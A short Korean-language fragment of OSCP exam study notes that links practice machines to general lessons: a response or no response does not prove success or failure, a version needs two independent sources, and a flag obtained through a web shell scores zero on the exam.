- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Squid]] — 누적 패턴 "응답이 성공을 뜻하지 않는다". §2-4·§6-③은 그 **거울상**(무응답도 실패를 뜻하지 않는다)
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개". §1-2가 그 실행
- [[Butch]] — ⚠️ 웹셸로 얻은 플래그는 OSCP에서 0점. 증거 스크린샷 형식
